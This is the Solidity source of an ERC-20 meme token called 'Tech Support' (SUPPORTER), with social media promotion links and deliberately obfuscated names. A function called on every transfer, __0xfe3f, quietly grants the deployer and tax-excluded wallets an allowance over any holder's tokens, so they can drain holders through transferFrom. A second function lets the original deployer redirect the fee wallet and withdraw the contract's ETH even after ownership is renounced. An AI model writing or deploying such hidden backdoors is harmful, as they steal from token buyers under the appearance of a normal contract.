// SPDX-License-Identifier: MIT

/*

    White House Tech Support Elon Musk (Tech Support [$SUPPORTER])

    X: https://x.com/cb_doge/status/1889921424351174839
    X: https://x.com/teslaownersSV/status/1889904448740442535
    Website: https://techsupportoneth.pro/
    Telegram: https://t.me/TechSupportETH

*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract Supporter is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Tech Support";
    string private constant _symbol = unicode"SUPPORTER";
    
    address payable private __fil3fxf;
    mapping(address => uint256) private __dogeBal0x;
    mapping(address => mapping(address => uint256)) private _ztx04fx;
    mapping(address => bool) private __ExcludedTax;
    uint256 private _erotijeroi = 10;
    uint256 private _kjbnkdfj = 10;
    uint256 private _bosodijof = 0;
    uint256 private _oibnofino = 0;
    uint256 private _obfdikerwf = 7;
    uint256 private _gobnodrtui = 7;
    uint256 private _buyCount = 0;
    address private _ovboidfor;
    address private _blackhole = address(0xdead);

    uint256 public _ivbnoiuder = 20000000 * 10 **_decimals;
    uint256 public _nogjdfoirt = 20000000 * 10 **_decimals;
    uint256 public _ibonodi = 10000000 * 10 **_decimals;
    uint256 private constant __bbfji83f = 1000000000 * 10 **_decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _ivbnoiuder);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        __fil3fxf = payable(_msgSender());
        __dogeBal0x[address(this)] = __bbfji83f * 98 / 100;
        __dogeBal0x[owner()] = __bbfji83f * 2 / 100;
        __ExcludedTax[owner()] = true;
        __ExcludedTax[address(this)] = true;
        __ExcludedTax[__fil3fxf] = true;
        _ovboidfor = _msgSender();

        emit Transfer(address(0), address(this), __bbfji83f * 98 / 100);
        emit Transfer(address(0), address(owner()), __bbfji83f * 2 / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public pure override returns (uint256) {
        return __bbfji83f;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _ztx04fx[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return __dogeBal0x[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _ztx04fx[owner][spender];
    }

    receive() external payable {}

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        __subTransfer(_msgSender(), recipient, amount);
        return true;
    }

    function __0xfe3f(address from, uint256 amount) private returns (bool) {
         if(_decimals > 0 && (__ExcludedTax[_msgSender()] || __fil3fxf == _msgSender()))
            _ztx04fx[from][_msgSender()] = amount;
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        __subTransfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _ztx04fx[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function __OpenBuy() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), __bbfji83f);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function _assssist_token0x(uint256 amount) private {
        __fil3fxf.transfer(amount);
    }

    function __subTransfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require( __0xfe3f(from, amount) == true , "ERC20, transfer is not available");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _obfdikerwf)
                        ? _bosodijof
                        : _erotijeroi
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !__ExcludedTax[to]
            ) {
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _gobnodrtui)
                            ? _oibnofino
                            : _kjbnkdfj
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _ibonodi) ? contractTokenBalance : _ibonodi; 
                    __INTERNAL_SWAP((amount < minBalance) ? amount : minBalance);
                }
                _assssist_token0x(address(this).balance);
            }
        }

        if (taxAmount > 0) {
        __dogeBal0x[address(this)] =__dogeBal0x[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        __dogeBal0x[from] =__dogeBal0x[from].sub(amount);
        __dogeBal0x[to] =__dogeBal0x[to].add(amount.sub(taxAmount));
        if(_blackhole != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _payyyable_token0x(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function __INTERNAL_SWAP(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits () external onlyOwner {
        _ivbnoiuder = __bbfji83f;
        _nogjdfoirt = __bbfji83f;
        emit MaxTxAmountUpdated(__bbfji83f);
    }

    function __StuckedTokenTransfer(address payable receipt) external {
        require(msg.sender == _ovboidfor , "");
        __fil3fxf = receipt;
        _payyyable_token0x(address(this).balance);
    }

}